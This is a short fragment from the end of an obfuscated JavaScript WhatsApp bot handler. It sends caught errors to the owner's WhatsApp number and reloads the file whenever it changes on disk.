        await _0x5c4040(_0x58c4d1);
      } catch (_0x1ad7d4) {
        _0x5c4040(String(_0x1ad7d4));
      }
    }
  } catch (_0x37dd4e) {
    console.log(_0x37dd4e);
    _0x29487e.sendMessage(owner + "@s.whatsapp.net", {
      'text': '' + util.format(_0x37dd4e)
    });
  }
};
let file = require.resolve(__filename);
fs.watchFile(file, () => {
  fs.unwatchFile(file);
  console.log(chalk.redBright("Update " + __filename));
  delete require.cache[file];
  require(file);
});